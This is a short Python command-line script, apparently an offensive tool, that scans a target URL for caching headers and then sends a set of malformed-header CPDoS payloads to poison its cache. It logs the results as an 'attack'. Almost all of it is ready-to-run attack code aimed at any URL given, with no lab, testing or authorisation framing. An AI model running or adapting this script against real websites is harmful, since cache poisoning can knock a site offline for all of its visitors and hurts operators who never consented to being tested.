import sys
import time
import requests

LOG_FILE = "cpdos_log.txt"

# Common CPDoS payloads
CPDOS_PAYLOADS = [
    {"Host": "invalid.host", "Content-Length": "999999"},
    {"Transfer-Encoding": "chunked", "Content-Length": "10"},
    {"Host": "127.0.0.1", "Content-Length": "0"},
]

def log_attack(target, results):
    """Logs attack results to a file."""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    with open(LOG_FILE, "a") as log:
        log.write(f"\n[{timestamp}] CPDoS Attack on {target}\n")
        for payload, status, response in results:
            log.write(f"Payload: {payload}\nStatus: {status}\nResponse: {response[:100]}\n---\n")
    print(f"[✔] Log saved to {LOG_FILE}")

def check_cache(target):
    """Scans the target for caching headers."""
    try:
        headers = {"Cache-Control": "no-cache"}
        response = requests.get(target, headers=headers, timeout=5)
        
        cache_headers = ["X-Cache", "Via", "Age", "CF-Cache-Status"]
        for header in cache_headers:
            if header in response.headers:
                print(f"[+] Caching Header Detected: {header} -> {response.headers[header]}")
                return True
        return False
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] {e}")
        return False

def launch_cpdos(target):
    """Executes CPDoS attacks with different payloads."""
    results = []
    for i, payload in enumerate(CPDOS_PAYLOADS):
        print(f"[*] Sending CPDoS Payload {i+1}...")
        try:
            response = requests.get(target, headers=payload, timeout=5)
            results.append((payload, response.status_code, response.text[:100]))
            print(f"[+] Response: {response.status_code}")
        except requests.exceptions.RequestException as e:
            results.append((payload, "FAILED", str(e)))
            print(f"[ERROR] Payload {i+1} failed: {e}")
    return results

def main(target):
    print(f"[+] Target: {target}")
    
    # Step 1: Check if caching is enabled
    print("[*] Scanning for caching proxies...")
    if check_cache(target):
        print("[✔] Caching detected! Proceeding with attack.")
    else:
        print("[✘] No caching detected. Exiting.")
        sys.exit(1)

    # Step 2: Launch CPDoS attack
    print("[*] Executing CPDoS attack...")
    result = launch_cpdos(target)
    
    # Step 3: Log the results
    log_attack(target, result)
    print("[✔] Attack complete. Check logs for details.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python cpdos.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    main(target_url)
